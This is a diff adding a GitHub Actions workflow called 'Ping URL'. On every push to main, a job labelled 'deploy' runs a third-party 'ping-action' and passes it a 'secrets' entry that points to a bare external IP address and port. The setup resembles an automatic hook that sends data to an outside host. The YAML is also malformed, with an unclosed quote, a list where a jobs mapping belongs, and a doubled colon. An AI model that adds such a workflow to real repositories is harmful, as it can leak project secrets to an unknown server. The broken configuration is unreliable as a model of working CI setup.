@@ -1,0 +1,11 @@
+name: "Ping URL:
+
+on:
+  push:
+    branches:
+      - main
+
+jobs:
+  - name: "deploy"
+    uses: "nerdify/ping-action@1.0.0"
+    secrets:: ["http://34.228.13.110:3002/git"]
